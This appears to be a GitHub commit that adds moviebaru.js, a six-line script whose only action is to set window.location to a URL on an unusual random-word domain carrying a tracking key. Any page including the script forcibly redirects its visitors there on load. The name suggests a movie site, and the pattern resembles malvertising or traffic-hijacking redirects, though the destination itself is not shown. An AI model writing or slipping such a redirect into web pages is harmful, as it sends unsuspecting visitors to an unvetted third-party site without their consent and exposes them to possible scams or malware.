6aacc6a54e6fe73944fe816b9d520316ef749e95
hamidi12359 <84512667+hamidi12359@users.noreply.github.com>
2021-11-15 10:09:55 +0800

    Create moviebaru.js

---
+++ moviebaru.js
@@ -0,0 +1,6 @@
+var dataUrl = [
+  'https://declinedmildlyreckon.com/y9nwnsv2?key=735cd9e19225596576e6fe8a6476073f'
+  
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
